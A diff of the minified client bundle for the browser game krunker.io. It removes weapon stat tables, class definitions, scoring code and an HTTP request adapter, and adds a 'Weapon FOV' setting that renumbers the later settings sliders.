-                    }, this.socket.onerror = function() {
-                        this.socket.readyState != WebSocket.OPEN && (a = !0, console.error("Socket error", arguments), e("Socket error"))
-                    }
-                } catch (t) {
-                    console.error("Socket connection error:", t), e(t)
-                }
-            }
-        },
-        send: function(t) {
-            if (this.socket) {
-                this.ahNum = r.rotateNumber(this.ahNum, s);
-                var e = Array.prototype.slice.call(arguments, 1),
-                    i = r.encodeNetworkMessage([t, e], 22);
-                this.socket.send(i)
-            } else console.warn("Socket not initialized yet.")
-        },
-        socketReady: function() {
-            return this.socket && this.connected
-        }
-    }
-}, function(t) {
-    t.exports = 71867
-}, function(t, e) {
-    t.exports = [{
-        name: "Sniper Rifle",
-        src: "weapon_1",
-        icon: "icon_1",
-        sound: "weapon_1",
-        nAuto: !0,
-        type: 0,
-        scope: !0,
-        swapTime: 300,
-        aimSpeed: 120,
-        spdMlt: .95,
-        ammo: 3,
-        reload: 1500,
-        dmg: 100,
-        pierce: .2,
-        range: 1e3,
-        dropStart: 230,
-        dmgDrop: 30,
-        scale: 1.1,
-        leftHoldY: -.7,
-        rightHoldY: -.75,
-        leftHoldZ: 2.4,
-        rightHoldZ: .4,
-        xOff: .8,
-        yOff: -.75,
-        zOff: -2,
-        xOrg: 0,
-        yOrg: -.55,
-        zOrg: -.8,
-        cLean: .5,
-        cRot: .4,
-        cDrop: .1,
-        inspectR: .4,
-        inspectM: .1,
-        muzOff: 8,
-        muzMlt: 1.6,
-        rate: 900,
-        spread: 260,
-        zoom: 2.7,
-        leanMlt: 1.5,
-        recoil: .009,
-        recoilR: .02,
-        recover: .993,
-        recoverY: .997,
-        recoverF: .975,
-        recoilY: 1,
-        recoilZ: 1.8
-    }, {
-        name: "Assault Rifle",
-        src: "weapon_2",
-        icon: "icon_2",
-        sound: "weapon_2",
-        transp: !0,
-        type: 0,
-        swapTime: 300,
-        aimSpeed: 130,
-        spdMlt: .95,
-        ammo: 30,
-        reload: 1200,
-        dmg: 22,
-        pierce: 1,
-        range: 700,
-        dmgDrop: 10,
-        scale: 1,
-        leftHoldY: -.55,
-        leftHoldX: -.08,
-        rightHoldY: -.7,
-        leftHoldZ: 2,
-        rightHoldZ: .2,
-        xOff: 1.2,
-        yOff: -1,
-        zOff: -2.5,
-        xOrg: 0,
-        yOrg: -.55,
-        zOrg: -.2,
-        cLean: .6,
-        cRot: .5,
-        cDrop: .1,
-        inspectR: .5,
-        inspectM: .9,
-        caseZOff: -1.7,
-        caseYOff: -.2,
-        muzOff: 5.9,
-        muzOffY: .3,
-        muzMlt: 1.4,
-        rate: 110,
-        spread: 120,
-        minSpread: 5,
-        zoom: 1.6,
-        leanMlt: 1,
-        recoil: .003,
-        recoilR: .016,
-        recover: .978,
-        recoverY: .995,
-        recoverF: .975,
-        recoilY: 1,
-        recoilZ: 5
-    }, {
-        name: "Pistol",
-        src: "weapon_3",
-        icon: "icon_3",
-        sound: "weapon_3",
-        secondary: !0,
-        transp: !0,
-        nAuto: !0,
-        kill: ["", 75],
-        type: 1,
-        swapTime: 350,
-        aimSpeed: 120,
-        spdMlt: 1.05,
-        ammo: 10,
-        reload: 700,
-        dmg: 20,
-        range: 700,
-        dmgDrop: 10,
-        scale: .95,
-        leftHoldY: -.82,
-        rightHoldY: -.62,
-        leftHoldZ: -.5,
-        rightHoldZ: -.5,
-        xOff: .7,
-        yOff: -.95,
-        zOff: -4.5,
-        xOrg: 0,
-        yOrg: -.2,
-        zOrg: -4.25,
-        cLean: .5,
-        cRot: .4,
-        cDrop: .1,
-        caseZOff: .2,
-        caseYOff: 0,
-        inspectR: .5,
-        inspectM: .8,
-        muzOff: 1.5,
-        muzOffY: 0,
-        muzMlt: .95,
-        rate: 150,
-        spread: 90,
-        zoom: 1.4,
-        leanMlt: 1,
-        recoil: .006,
-        recoilR: .005,
-        recover: .98,
-        recoverY: .99,
-        recoverF: .98,
-        recoilY: 3,
-        recoilZ: 1
-    }, {
-        name: "Submachine Gun",
-        src: "weapon_4",
-        icon: "icon_4",
-        sound: "weapon_4",
-        transp: !0,
-        newM: !0,
-        type: 0,
-        swapTime: 300,
-        aimSpeed: 120,
-        spdMlt: 1.04,
-        ammo: 24,
-        reload: 1200,
-        dmg: 18,
-        pierce: 1,
-        range: 700,
-        dmgDrop: 12,
-        scale: 1.1,
-        leftHoldY: -.4,
-        leftHoldX: -.1,
-        rightHoldY: -.5,
-        leftHoldZ: 1.1,
-        rightHoldZ: -.95,
-        xOff: .95,
-        yOff: -.95,
-        zOff: -3,
-        xOrg: 0,
-        yOrg: -.57,
-        zOrg: -2.5,
-        cRot: .4,
-        cLean: .4,
-        inspectR: .4,
-        inspectM: 1.3,
-        caseYOff: -.15,
-        caseZOff: -.4,
-        muzOff: 2.15,
-        muzOffY: .1,
-        rate: 90,
-        spread: 170,
-        minSpread: 10,
-        zoom: 1.5,
-        leanMlt: 1,
-        recoil: .0034,
-        recoilR: .015,
-        recover: .978,
-        recoverY: .996,
-        recoverF: .975,
-        recoilY: .3,
-        recoilZ: 3.8
-    }, {
-        name: "Revolver",
-        src: "weapon_5",
-        icon: "icon_5",
-        sound: "weapon_5",
-        nAuto: !0,
-        nCase: !0,
-        transp: !0,
-        kill: ["", 50],
-        type: 1,
-        swapTime: 200,
-        aimSpeed: 120,
-        spdMlt: 1.04,
-        ammo: 6,
-        reload: 900,
-        dmg: 66,
-        pierce: .85,
-        dmgDrop: 10,
-        scale: 1.3,
-        leftHoldY: -1,
-        rightHoldY: -.8,
-        leftHoldZ: -.5,
-        rightHoldZ: -.5,
-        xOff: .7,
-        yOff: -.8,
-        zOff: -4.1,
-        xOrg: 0,
-        yOrg: -.35,
-        zOrg: -3.8,
-        cLean: .5,
-        cRot: .4,
-        cDrop: .1,
-        inspectR: .4,
-        inspectM: .3,
-        muzOff: 2.75,
-        muzOffY: .2,
-        muzMlt: .95,
-        range: 700,
-        rate: 300,
-        spread: 100,
-        zoom: 1.4,
-        leanMlt: 1.6,
-        recoil: .013,
-        recoilR: .012,
-        recover: .982,
-        recoverY: .992,
-        recoverF: .98,
-        recoilY: 1.5,
-        recoilZ: 2
-    }, {
-        name: "Shotgun",
-        src: "weapon_6",
-        icon: "icon_6",
-        sound: "weapon_6",
-        nAuto: !0,
-        nCase: !0,
-        nRing: !0,
-        type: 0,
-        swapTime: 300,
-        aimSpeed: 180,
-        spdMlt: 1,
-        ammo: 2,
-        shots: 5,
-        reload: 1100,
-        dmg: 50,
-        dmgDrop: 40,
-        scale: 1.25,
-        leftHoldY: -.7,
-        rightHoldY: -.9,
-        leftHoldZ: 1.2,
-        rightHoldZ: -.3,
-        xOff: .95,
-        yOff: -.8,
-        zOff: -3,
-        xOrg: 0,
-        yOrg: -.2,
-        zOrg: -1.5,
-        cLean: .5,
-        cRot: .4,
-        cDrop: .1,
-        inspectR: .4,
-        inspectM: .6,
-        muzOff: 6,
-        muzMlt: 1.5,
-        range: 240,
-        rate: 400,
-        innac: 110,
-        spread: 120,
-        minSpread: 20,
-        zoom: 1.25,
-        leanMlt: 1.6,
-        recoil: .013,
-        recoilR: .015,
-        recover: .99,
-        recoverF: .975,
-        recoilY: .8,
-        recoilZ: 2
-    }, {
-        name: "Light Machine Gun",
-        src: "weapon_7",
-        icon: "icon_7",
-        sound: "weapon_7",
-        transp: !0,
-        type: 0,
-        swapTime: 800,
-        aimSpeed: 200,
-        spdMlt: .79,
-        ammo: 100,
-        reload: 2500,
-        dmg: 22,
-        pierce: 1,
-        range: 700,
-        dmgDrop: 10,
-        scale: 1.3,
-        leftHoldY: -.65,
-        leftHoldX: .4,
-        rightHoldY: -.75,
-        leftHoldZ: 1,
-        rightHoldZ: -.2,
-        xOff: .95,
-        yOff: -.8,
-        zOff: -2.8,
-        xOrg: 0,
-        yOrg: -.45,
-        zOrg: -2,
-        cLean: .3,
-        cRot: .4,
-        cDrop: 0,
-        inspectR: .4,
-        inspectM: .6,
-        caseInd: 2,
-        caseZOff: -.5,
-        caseYOff: -.1,
-        muzOff: 5.5,
-        muzMlt: 1.65,
-        rate: 120,
-        spread: 300,
-        minSpread: 15,
-        zoom: 1.2,
-        leanMlt: 1.6,
-        recoil: .0032,
-        recoilR: .012,
-        recover: .98,
-        recoverY: .9975,
-        recoverF: .975,
-        recoilY: .4,
-        recoilZ: 3.8
-    }, {
-        name: "Semi Auto",
-        src: "weapon_8",
-        icon: "icon_8",
-        sound: "weapon_8",
-        nAuto: !0,
-        type: 0,
-        scope: !0,
-        swapTime: 400,
-        aimSpeed: 120,
-        spdMlt: 1,
-        ammo: 8,
-        reload: 1300,
-        dmg: 35,
-        pierce: .2,
-        range: 1e3,
-        dmgDrop: 0,
-        scale: 1,
-        leftHoldY: -.7,
-        rightHoldY: -.75,
-        leftHoldZ: 2.4,
-        rightHoldZ: .4,
-        xOff: .8,
-        yOff: -.75,
-        zOff: -2,
-        xOrg: 0,
-        yOrg: -.55,
-        zOrg: -.8,
-        cLean: .5,
-        cRot: .4,
-        cDrop: .1,
-        inspectR: .4,
-        inspectM: .3,
-        muzOff: 5.7,
-        muzOffY: .5,
-        muzMlt: 1.4,
-        rate: 220,
-        spread: 300,
-        zoom: 2.4,
-        leanMlt: 2,
-        recoil: .01,
-        recoilR: .01,
-        recover: .984,
-        recoverY: .997,
-        recoverF: .975,
-        recoilY: .4,
-        recoilZ: 1.8
-    }, {
-        name: "Rocket Launcher",
-        src: "weapon_9",
-        icon: "icon_9",
-        sound: "weapon_9",
-        nInsp: !0,
-        nSkill: !0,
-        nAuto: !0,
-        nCase: !0,
-        nRing: !0,
-        projectile: 0,
-        type: 0,
-        swapTime: 600,
-        aimSpeed: 200,
-        spdMlt: .9,
-        ammo: 1,
-        reload: 1600,
-        scale: 1.3,
-        leftHoldY: -.5,
-        rightHoldY: -.6,
-        leftHoldZ: 3.2,
-        rightHoldZ: 1.6,
-        xOff: .95,
-        yOff: -.4,
-        zOff: -.7,
-        xOrg: 0,
-        yOrg: -.6,
-        zOrg: -1.5,
-        cLean: .2,
-        cRot: .2,
-        cDrop: .1,
-        muzOff: 5,
-        muzOffY: 0,
-        muzMlt: 1.5,
-        rate: 1,
-        spread: 120,
-        minSpread: 15,
-        zoom: 1.5,
-        leanMlt: 1.4,
-        recoil: .008,
-        recoilR: .012,
-        recover: .99,
-        recoverY: .998,
-        recoverF: .975,
-        recoilY: .8,
-        recoilZ: 4
-    }, {
-        name: "Akimbo Uzi",
-        src: "weapon_10",
-        icon: "icon_10",
-        sound: "weapon_10",
-        nInsp: !0,
-        noAim: !0,
-        akimbo: !0,
-        type: 0,
-        swapTime: 300,
-        aimSpeed: 120,
-        spdMlt: 1.04,
-        ammo: 18,
-        reload: 1200,
-        dmg: 18,
-        pierce: 1,
-        range: 700,
-        dmgDrop: 12,
-        scale: .9,
-        rightHoldY: -.55,
-        leftHoldZ: .3,
-        leftHoldX: -.25,
-        leftHoldY: -.55,
-        rightHoldZ: .3,
-        rightHoldX: -.25,
-        holdW: 1.3,
-        xOff: 1.5,
-        yOff: -.95,
-        zOff: -3.3,
-        xOrg: 0,
-        yOrg: -.62,
-        zOrg: -2.5,
-        zLnM: .4,
-        cLean: .1,
-        cRot: .1,
-        cDrop: .2,
-        caseYOff: -.15,
-        caseZOff: -.4,
-        muzOff: 3.6,
-        rate: 60,
-        spread: 40,
-        spreadInc: 1.5,
-        minSpread: 10,
-        zoom: 1.5,
-        leanMlt: 1,
-        recoil: .0034,
-        recoilR: .015,
-        recover: .978,
-        recoverY: .996,
-        recoverF: .975,
-        recoilY: .3,
-        recoilZ: 5
-    }, {
-        name: "Desert Eagle",
-        src: "weapon_11",
-        icon: "icon_11",
-        sound: "weapon_11",
-        secondary: !0,
-        minRec: 15,
-        nAuto: !0,
-        transp: !0,
-        kill: ["", 50],
-        type: 1,
-        swapTime: 200,
-        aimSpeed: 120,
-        spdMlt: 1,
-        ammo: 6,
-        reload: 1e3,
-        dmg: 50,
-        pierce: .85,
-        dmgDrop: 10,
-        scale: .94,
-        leftHoldY: -.9,
-        rightHoldY: -.7,
-        leftHoldZ: -.5,
-        rightHoldZ: -.5,
-        holdW: .95,
-        xOff: 1.3,
-        yOff: -.95,
-        zOff: -4.1,
-        xOrg: 0,
-        yOrg: -.2,
-        zOrg: -3.8,
-        cLean: .5,
-        cRot: .8,
-        cDrop: .1,
-        inspectR: .5,
-        inspectM: .9,
-        muzOff: 2,
-        muzMlt: 1.1,
-        range: 700,
-        rate: 400,
-        spread: 150,
-        zoom: 1.4,
-        leanMlt: 1.6,
-        recoil: .01,
-        recoilR: .01,
-        recover: .985,
-        recoverY: .996,
-        recoverF: .98,
-        recoilY: 1.4,
-        recoilZ: 2
-    }, {
-        name: "Alien Blaster",
-        src: "weapon_13",
-        icon: "icon_13",
-        sound: "weapon_13",
-        secondary: !0,
-        nRing: !0,
-        nAuto: !0,
-        transp: !0,
-        nCase: !0,
-        minRec: 50,
-        kill: ["", 50],
-        type: 1,
-        swapTime: 200,
-        aimSpeed: 120,
-        spdMlt: 1,
-        ammo: 4,
-        reload: 1500,
-        dmg: 50,
-        pierce: .85,
-        dmgDrop: 10,
-        scale: 1.1,
-        leftHoldY: -1,
-        rightHoldY: -.65,
-        leftHoldZ: -.2,
-        rightHoldZ: -.2,
-        xOff: 1.3,
-        yOff: -.95,
-        zOff: -4.1,
-        xOrg: 0,
-        yOrg: -.6,
-        zOrg: -3.8,
-        cLean: .4,
-        cRot: .6,
-        cDrop: 0,
-        inspectR: .5,
-        inspectM: .8,
-        holdW: .7,
-        muzOff: 2.2,
-        muzOffY: .1,
-        muzID: 3,
-        muzMlt: 1.1,
-        range: 700,
-        rate: 150,
-        spread: 150,
-        zoom: 1.4,
-        leanMlt: 1.6,
-        recoil: .007,
-        recoilR: .01,
-        recover: .985,
-        recoverY: .996,
-        recoverF: .98,
-        recoilY: 1.05,
-        recoilZ: 2
-    }, {
-        name: "Hands",
-        melee: !0,
-        nInsp: !0,
-        type: 1,
-        swapTime: 350,
-        spdMlt: 1.1,
-        spread: 100,
-        leftHoldY: -.82,
-        leftHoldX: 1.3,
-        rightHoldX: -1.3,
-        rightHoldY: -.82,
-        leftHoldZ: -.5,
-        rightHoldZ: -.5,
-        xOff: 0,
-        yOff: -.95,
-        zOff: -3,
-        xOrg: 0,
-        yOrg: 0,
-        zOrg: 0,
-        leanMlt: 1
-    }]
-}, function(t, e) {
-    t.exports = [{
-        name: "Triggerman",
-        loadout: [1],
-        secondary: !0,
-        colors: [10975328, 4013373, 2302755, 2631720, 7098434, 12566463],
-        health: 100,
-        speed: 1.05
-    }, {
-        name: "Hunter",
-        loadout: [0],
-        secondary: !0,
-        colors: [10975328, 8083261, 6506290, 2631720, 6506290, 6506290],
-        health: 60,
-        speed: 1.05
-    }, {
-        name: "Run N Gun",
-        loadout: [3],
-        colors: [10975328, 4088706, 3099491, 2631720, 6506290, 3099491],
-        health: 100,
-        speed: 1.18
-    }, {
-        name: "Spray N Pray",
-        loadout: [6],
-        colors: [10975328, 5793865, 4806204, 2631720, 2631720, 4806204],
-        health: 170,
-        speed: 1
-    }, {
-        name: "Vince",
-        loadout: [5],
-        secondary: !0,
-        colors: [8412234, 5526119, 4144461, 2631720, 2631720, 4144461],
-        health: 100,
-        speed: 1
-    }, {
-        name: "Detective",
-        loadout: [4],
-        colors: [10975328, 7360054, 6308654, 2631720, 6506290, 6308654],
-        health: 100,
-        speed: 1
-    }, {
-        name: "Marksman",
-        loadout: [7],
-        secondary: !0,
-        colors: [10975328, 5793865, 4806204, 2631720, 2631720, 4806204],
-        health: 100,
-        speed: 1
-    }, {
-        name: "Rocketeer",
-        loadout: [8],
-        secondary: !0,
-        colors: [10975328, 5793865, 4806204, 2631720, 7098434, 4806204],
-        health: 130,
-        speed: .86
-    }, {
-        name: "Agent",
-        loadout: [9],
-        colors: [10975328, 4013373, 2302755, 2631720, 2631720, 12566463],
-        health: 100,
-        speed: 1.2
-    }, {
-        name: "Runner",
-        hide: !0,
-        loadout: [12],
-        colors: [10975328, 4013373, 2302755, 2631720, 2631720, 2302755],
-        health: 100,
-        speed: 1
-    }, {
-        name: "Deagler",
-        hide: !0,
-        loadout: [10],
-        colors: [10975328, 4013373, 2302755, 2631720, 2631720, 2302755],
-        health: 60,
-        speed: 1
-    }]
-}, function(t, e) {
-    var i = ["Double Kill", "Triple Kill", "Quad Kill", "Multi Kill", "Mega Kill", "Ultra Kill", "Super Kill"],
-        n = [];
-    t.exports.reward = function(t, e, r, s, o) {
-        if (n.length = 0, e.weapon.melee) n.push("Execution", 300);
-        else {
-            e.weapon.kill ? n.push(e.weapon.kill[0], e.weapon.kill[1]) : e.weapon.scope && 1 == e.aimVal ? n.push("No Scope", 100) : !e.weapon.scope || 0 == e.aimVal && 180 < e.aimTime || 1 == e.aimDir ? n.push("", 50) : n.push("Quick Scope", 75), 1 >= o.kills && n.push("First Blood", 25);
-            var a = t.getSpin(e);
-            !e.weapon.nSkill && 360 <= a && n.push("360!", 150), s.headShot && n.push("Headshot", 50), !e.weapon.scope && 200 < s.dst * e.weapon.range && n.push("Longshot", 25)
-        }
-        e.health <= .2 * e.maxHealth && e.active && n.push("Close Call", 20), 5 <= e.deathStreak && n.push("Comeback", 25), 10 <= r.killStreak ? n.push("Buzzkill", 25) : 5 <= r.killStreak && n.push("Buzzkill", 10), 0 < e.slideTimer && n.push("Driftkill", 50), 400 <= e.airTime && n.push("Mid Air", 25);
-        for (var c = i.length - 1; 0 <= c; --c)
-            if (e.streak > c) {
-                n.push(i[c], 50 * (c + 1));
-                break
-            } return n.length ? n : null
-    }, t.exports.getScore = function(t) {
-        var e = 0;
-        if (t)
-            for (var i = 1; i < t.length; i += 2) e += t[i];
-        return e
-    }
-}, , function(t, e, i) {
-    "use strict";
-    t.exports = function(t, e) {
-        return function() {
-            for (var i = Array(arguments.length), n = 0; n < i.length; n++) i[n] = arguments[n];
-            return t.apply(e, i)
-        }
-    }
-}, function(t, e, i) {
-    "use strict";
-    var n = i(12),
-        r = i(71),
-        s = i(73),
-        o = i(74),
-        a = i(75),
-        c = i(58),
-        l = "undefined" != typeof window && window.btoa && window.btoa.bind(window) || i(76);
-    t.exports = function(t) {
-        return new Promise(function(e, p) {
-            var h = t.data,
-                u = t.headers;
-            n.isFormData(h) && delete u["Content-Type"];
-            var d = new XMLHttpRequest,
-                f = "onreadystatechange",
-                m = !1;
-            if ("undefined" == typeof window || !window.XDomainRequest || "withCredentials" in d || a(t.url) || (d = new window.XDomainRequest, f = "onload", m = !0, d.onprogress = function() {}, d.ontimeout = function() {}), t.auth) {
-                var g = t.auth.username || "",
-                    v = t.auth.password || "";
-                u.Authorization = "Basic " + l(g + ":" + v)
-            }
-            if (d.open(t.method.toUpperCase(), s(t.url, t.params, t.paramsSerializer), !0), d.timeout = t.timeout, d[f] = function() {
-                    if (d && (4 === d.readyState || m) && (0 !== d.status || d.responseURL && 0 === d.responseURL.indexOf("file:"))) {
-                        var i = "getAllResponseHeaders" in d ? o(d.getAllResponseHeaders()) : null,
-                            n = {
-                                data: t.responseType && "text" !== t.responseType ? d.response : d.responseText,
-                                status: 1223 === d.status ? 204 : d.status,
-                                statusText: 1223 === d.status ? "No Content" : d.statusText,
-                                headers: i,
-                                config: t,
-                                request: d
-                            };
-                        r(e, p, n), d = null
-                    }
-                }, d.onerror = function() {
-                    p(c("Network Error", t, null, d)), d = null
-                }, d.ontimeout = function() {
-                    p(c("timeout of " + t.timeout + "ms exceeded", t, "ECONNABORTED", d)), d = null
-                }, n.isStandardBrowserEnv()) {
-                var y = i(77),
-                    x = (t.withCredentials || a(t.url)) && t.xsrfCookieName ? y.read(t.xsrfCookieName) : void 0;
-                x && (u[t.xsrfHeaderName] = x)
-            }
-            if ("setRequestHeader" in d && n.forEach(u, function(t, e) {
-                    void 0 === h && "content-type" === e.toLowerCase() ? delete u[e] : d.setRequestHeader(e, t)
-                }), t.withCredentials && (d.withCredentials = !0), t.responseType) try {
-                d.responseType = t.responseType
-            } catch (e) {
-                if ("json" !== t.responseType) throw e
-            }
-            "function" == typeof t.onDownloadProgress && d.addEventListener("progress", t.onDownloadProgress), "function" == typeof t.onUploadProgress && d.upload && d.upload.addEventListener("progress", t.onUploadProgress), t.cancelToken && t.cancelToken.promise.then(function(t) {
-                d && (d.abort(), p(t), d = null)
-            }), void 0 === h && (h = null), d.send(h)
-        })
-    }
-}, function(t, e, i) {
-    "use strict";
-    var n = i(72);
-    t.exports = function(t, e, i, r, s) {
-        var o = new Error(t);
-        return n(o, e, i, r, s)
-    }
-}, function(t, e, i) {
-    "use strict";
-    t.exports = function(t) {
-        return !(!t || !t.__CANCEL__)
-    }
-}, function(t, e, i) {
-    "use strict";
-
-    function n(t) {
-        this.message = t
-    }
-    n.prototype.toString = function() {
-        return "Cancel" + (this.message ? ": " + this.message : "")
-    }, n.prototype.__CANCEL__ = !0, t.exports = n
-}, function(t, e, i) {
     var n = i(1),
         r = "undefined" != typeof Storage;
 
@@ -43111,8 +42173,8 @@
     }, window.openURL = function(t) {
         window.open(t, "_blank")
     };
-    var o = i(62).default;
-    o.PING_REGION_CACHE_KEY = "pingRegion3";
+    var o = i(57).default;
+    o.PING_REGION_CACHE_KEY = "pingRegion4";
     var a = new o("krunker.io"),
         c = null,
         l = null,
@@ -43163,22 +42225,22 @@
         }
     });
     var d = i(2);
-    d.OBJLoader = i(45)(d), d.Shaders = i(85)(d);
-    var f = i(4),
-        m = new(i(44))(d, f, n),
-        g = window.SOUND = new(i(86))(f, n),
-        v = new(i(49))(m, n),
-        y = i(87),
-        x = new(i(88))(m, n),
-        w = i(50),
-        b = i(89).obj;
+    d.OBJLoader = i(45)(d), d.Shaders = i(80)(d);
+    var f = i(5),
+        m = new(i(46))(d, f, n),
+        g = window.SOUND = new(i(81))(f, n),
+        v = new(i(82))(m, n),
+        y = i(83),
+        x = new(i(84))(m, n),
+        w = i(47),
+        b = i(85).obj;
     b = new b(!1, 0, null, m, g, v);
-    var M, _, S, E, T, A, L = new(i(94))(m, d, y, f, b, n, w),
+    var M, _, S, E, T, A, L = new(i(93))(m, d, y, f, b, n, w),
         R = i(42).maps,
         k = i(42).modes,
-        P = i(95),
-        C = i(47).Player,
-        I = new(i(96)),
+        P = i(94),
+        C = i(55).Player,
+        I = new(i(95)),
         O = new d.Vector3,
         D = !1,
         B = !1;
@@ -43355,7 +42417,7 @@
         var i = document.getElementById("customSet" + t);
         i && (i.innerHTML = e)
     }, window.setSetting = function(t, e) {
-        document.getElementById("slid" + t) && (document.getElementById("slid" + t).innerHTML = e), yt[t].set(e), yt[t].val = e, saveVal("kro_setng_" + t, e)
+        document.getElementById("slid" + t) && (document.getElementById("slid" + t).innerHTML = e), yt[t].set(e), yt[t].val = e, saveVal("kro_setngss_" + t, e)
     };
     for (var yt = [{
             name: "<div style='width:100%'><a href='javascript:;' onclick='showWindow(7);' class='menuLink'>Change Controls</a></div>",
@@ -43447,10 +42509,19 @@
                 m.setFov(t)
             }
         }, {
+            name: "Weapon FOV",
+            val: n.fov,
+            html: function() {
+                return "<span class='sliderVal' id='slid10'>" + yt[10].val + "</span><div class='slidecontainer'><input type='range' min='60' max='120' step='5' value='" + yt[10].val + "' class='sliderM' oninput='setSetting(10, this.value)'></div>"
+            },
+            set: function(t) {
+                m.setFPSFov(t)
+            }
+        }, {
             name: "Invert Y-Axis",
             val: !1,
             html: function() {
-                return "<label class='switch'><input type='checkbox' onclick='setSetting(10, this.checked)' " + (yt[10].val ? "checked" : "") + "><span class='slider'></span></label>"
+                return "<label class='switch'><input type='checkbox' onclick='setSetting(11, this.checked)' " + (yt[11].val ? "checked" : "") + "><span class='slider'></span></label>"
             },
             set: function(t) {
                 L.invertY = t
@@ -43460,7 +42531,7 @@
             pre: "<div class='setHed'>Audio</div>",
             val: 1,
             html: function() {
-                return "<span class='sliderVal' id='slid11'>" + yt[11].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.1' value='" + yt[11].val + "' class='sliderM' oninput='setSetting(11, this.value)'></div>"
+                return "<span class='sliderVal' id='slid12'>" + yt[12].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.1' value='" + yt[12].val + "' class='sliderM' oninput='setSetting(12, this.value)'></div>"
             },
             set: function(t) {
                 g.setVolume(t)
@@ -43469,7 +42540,7 @@
             name: "Voice Volume",
             val: 1,
             html: function() {
-                return "<span class='sliderVal' id='slid12'>" + yt[12].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.1' value='" + yt[12].val + "' class='sliderM' oninput='setSetting(12, this.value)'></div>"
+                return "<span class='sliderVal' id='slid13'>" + yt[13].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.1' value='" + yt[13].val + "' class='sliderM' oninput='setSetting(13, this.value)'></div>"
             },
             set: function(t) {
                 mt = t
@@ -43479,7 +42550,7 @@
             pre: "<div class='setHed'>Editing</div>",
             val: 1,
             html: function() {
-                return "<span class='sliderVal' id='slid13'>" + yt[13].val + "</span><div class='slidecontainer'><input type='range' min='0' max='2' step='0.1' value='" + yt[13].val + "' class='sliderM' oninput='setSetting(13, this.value)'></div>"
+                return "<span class='sliderVal' id='slid14'>" + yt[14].val + "</span><div class='slidecontainer'><input type='range' min='0' max='2' step='0.1' value='" + yt[14].val + "' class='sliderM' oninput='setSetting(14, this.value)'></div>"
             },
             set: function(t) {
                 m.weaponLean = t
@@ -43488,7 +42559,7 @@
             name: "Show Weapon",
             val: !0,
             html: function() {
-                return "<label class='switch'><input type='checkbox' onclick='setSetting(14, this.checked)' " + (yt[14].val ? "checked" : "") + "><span class='slider'></span></label>"
+                return "<label class='switch'><input type='checkbox' onclick='setSetting(15, this.checked)' " + (yt[15].val ? "checked" : "") + "><span class='slider'></span></label>"
             },
             set: function(t) {
                 b.hideWeapon = !t, M && M.weaponMeshes[M.weaponIndex] && (M.weaponMeshes[M.weaponIndex].visible = t)
@@ -43497,7 +42568,7 @@
             name: "Depth Map",
             val: 0,
             html: function() {
-                return "<span class='sliderVal' id='slid15'>" + yt[15].val + "</span><div class='slidecontainer'><input type='range' min='0' max='500' step='5' value='" + yt[15].val + "' class='sliderM' oninput='setSetting(15, this.value)'></div>"
+                return "<span class='sliderVal' id='slid16'>" + yt[16].val + "</span><div class='slidecontainer'><input type='range' min='0' max='500' step='5' value='" + yt[16].val + "' class='sliderM' oninput='setSetting(16, this.value)'></div>"
             },
             set: function(t) {
                 m.toggleDepthMap(t)
@@ -43506,7 +42577,7 @@
             name: "Green Screen",
             val: !1,
             html: function() {
-                return "<label class='switch'><input type='checkbox' onclick='setSetting(16, this.checked)' " + (yt[16].val ? "checked" : "") + "><span class='slider'></span></label>"
+                return "<label class='switch'><input type='checkbox' onclick='setSetting(17, this.checked)' " + (yt[17].val ? "checked" : "") + "><span class='slider'></span></label>"
             },
             set: function(t) {
                 m.toggleGreenscreen(t)
@@ -43516,7 +42587,7 @@
             pre: "<div class='setHed'>Shaders</div>",
             val: !0,
             html: function() {
-                return "<label class='switch'><input type='checkbox' onclick='setSetting(17, this.checked)' " + (yt[17].val ? "checked" : "") + "><span class='slider'></span></label>"
+                return "<label class='switch'><input type='checkbox' onclick='setSetting(18, this.checked)' " + (yt[18].val ? "checked" : "") + "><span class='slider'></span></label>"
             },
             set: function(t) {
                 m.toggleMeshGroup("ambient_0", t), m.toggleMeshGroup("ambient_1", t)
@@ -43525,7 +42596,7 @@
             name: "Bloom",
             val: 0,
             html: function() {
-                return "<span class='sliderVal' id='slid18'>" + yt[18].val + "</span><div class='slidecontainer'><input type='range' min='0' max='3' step='0.1' value='" + yt[18].val + "' class='sliderM' oninput='setSetting(18, this.value)'></div>"
+                return "<span class='sliderVal' id='slid19'>" + yt[19].val + "</span><div class='slidecontainer'><input type='range' min='0' max='3' step='0.1' value='" + yt[19].val + "' class='sliderM' oninput='setSetting(19, this.value)'></div>"
             },
             set: function(t) {
                 m.bloomPass && (m.bloomPass.strength = t), m.postprocessing.bloomStrength = t, m.postprocessing.enabled = "0" != t
@@ -43534,7 +42605,7 @@
             name: "Bloom Radius",
             val: .9,
             html: function() {
-                return "<span class='sliderVal' id='slid19'>" + yt[19].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.01' value='" + yt[19].val + "' class='sliderM' oninput='setSetting(19, this.value)'></div>"
+                return "<span class='sliderVal' id='slid20'>" + yt[20].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.01' value='" + yt[20].val + "' class='sliderM' oninput='setSetting(20, this.value)'></div>"
             },
             set: function(t) {
                 m.bloomPass && (m.bloomPass.radius = t), m.postprocessing.bloomRadius = t
@@ -43543,7 +42614,7 @@
             name: "Bloom Treshold",
             val: .9,
             html: function() {
-                return "<span class='sliderVal' id='slid20'>" + yt[20].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.01' value='" + yt[20].val + "' class='sliderM' oninput='setSetting(20, this.value)'></div>"
+                return "<span class='sliderVal' id='slid21'>" + yt[21].val + "</span><div class='slidecontainer'><input type='range' min='0' max='1' step='0.01' value='" + yt[21].val + "' class='sliderM' oninput='setSetting(21, this.value)'></div>"
             },
             set: function(t) {
                 m.bloomPass && (m.bloomPass.threshold = t), m.postprocessing.bloomTresh = t
@@ -43553,14 +42624,14 @@
             pre: "<div class='setHed'>Mods</div>",
             val: !0,
             html: function() {
-                return "<label class='switch'><input type='checkbox' onclick='setSetting(21, this.checked)' " + (yt[21].val ? "checked" : "") + "><span class='slider'></span></label>"
+                return "<label class='switch'><input type='checkbox' onclick='setSetting(22, this.checked)' " + (yt[22].val ? "checked" : "") + "><span class='slider'></span></label>"
             },
             set: function(t) {
                 z = t
             }
         }], xt = 0; xt < yt.length; ++xt)
